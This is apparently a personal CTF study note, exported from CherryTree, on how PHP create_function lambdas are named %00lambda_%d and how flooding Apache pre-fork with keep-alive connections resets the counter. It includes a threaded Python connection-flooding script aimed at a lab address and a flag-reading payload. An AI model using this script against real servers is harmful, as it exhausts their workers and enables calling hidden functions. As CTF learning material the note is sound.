<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>匿名函数</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>匿名函数</h1><br/><br />匿名函数例如：$FLAG    = create_function(&quot;&quot;, &#39;die(`/read_flag`);&#39;);<br /><br />create_function(&quot;参数&quot;,&quot;代码&quot;);<br />$FLAG表示整个函数<br /><br /><br />通过 create_function ，并没有设置函数名字，但其实这里声明的函数是有函数名的，<br />匿名函数会被设置为 %00lambda_%d ，这里的%d是顺序递增的<br /><br />在apache默认模式下，即pre-fork模式下，<br />apache会预创建一定的线程用于连接，大量访问的时候 (keep-alive)，线程不够用时，就会启动新的线程，此时，%d重置为1<br /><br /><div class="codebox"><div class="codebox">import&nbsp;requests<br />import&nbsp;socket<br />import&nbsp;time<br />from&nbsp;multiprocessing.dummy&nbsp;import&nbsp;Pool&nbsp;as&nbsp;ThreadPool<br />try:<br />&nbsp;&nbsp;&nbsp;&nbsp;requests.packages.urllib3.disable_warnings()<br />except:<br />&nbsp;&nbsp;&nbsp;&nbsp;pass<br /><br />def&nbsp;run(i):<br />&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;1:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HOST&nbsp;=&nbsp;&#39;172.17.0.2&#39;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PORT&nbsp;=&nbsp;80<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s.connect((HOST,&nbsp;PORT))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s.sendall(&#39;GET&nbsp;/&nbsp;HTTP/1.1nHost:&nbsp;localhostnConnection:&nbsp;Keep-Alivenn&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;s.close()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&#39;ok&#39;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(0.5)<br /><br />i&nbsp;=&nbsp;8<br />pool&nbsp;=&nbsp;ThreadPool(&nbsp;i&nbsp;)<br />result&nbsp;=&nbsp;pool.map_async(&nbsp;run,&nbsp;range(i)&nbsp;).get(0xffff)<br />#.get(0xffff)用于ctrl+c结束进程</div></div><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>